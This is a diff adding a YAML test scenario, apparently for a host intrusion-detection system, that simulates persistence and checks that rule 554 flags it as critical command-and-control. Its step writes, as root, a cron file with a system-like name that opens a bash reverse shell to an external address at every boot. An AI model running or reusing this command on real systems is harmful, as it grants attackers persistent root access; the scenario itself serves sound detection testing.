@@ -1,0 +1,21 @@
+name: cron-reboot-shell
+description: A cron job opens a reverse shell to an external address at every boot.
+agent: black-host-01
+wait_s: 90
+steps:
+- host: black-host-01
+  user: root
+  run: echo '@reboot root /bin/bash -c "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1"' > /etc/cron.d/0hourly-sync
+cleanup:
+- host: black-host-01
+  user: root
+  run: rm -f /etc/cron.d/0hourly-sync
+expected:
+- rule_id: '554'
+  verdict: true_positive
+  severity: critical
+  category: command_and_control
+  why: A boot-time reverse shell to an external address, hidden behind a system-like name.
+  match:
+    syscheck.path: /etc/cron.d/0hourly-sync
+  needs_context: true
